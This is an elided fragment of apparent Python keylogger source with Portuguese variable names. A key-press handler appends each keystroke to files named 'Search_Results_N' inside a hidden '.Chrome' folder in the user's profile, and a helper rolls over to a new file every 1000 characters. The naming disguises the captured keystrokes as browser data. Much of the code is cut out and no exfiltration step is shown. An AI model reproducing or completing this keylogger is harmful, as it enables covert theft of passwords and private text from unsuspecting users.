...
def verificação():
    ...
    if not exists(f'C:\\Users\\{user}\\.Chrome\\Search_Results_1'):
        f = open(
            f'C:\\Users\\{user}\\.Chrome\\Search_Results_1', 'w', encoding='utf-8')
        f.close()
    ...
    f = open(
        f'C:\\Users\\{user}\\.Chrome\\Search_Results_{cont}', 'r', encoding='utf-8')
    ...
    if numero_de_caracteres >= 1000:
        ...
        f = open(
            f'C:\\Users\\{user}\\.Chrome\\Search_Results_{numeraçao_arquivo}', 'w', encoding='utf-8')
        f.close()
...
def on_press(key):
    ...
    try:
        f = open(
            f'C:\\Users\\{user}\\.Chrome\\Search_Results_{cont}', 'a', encoding='utf-8')
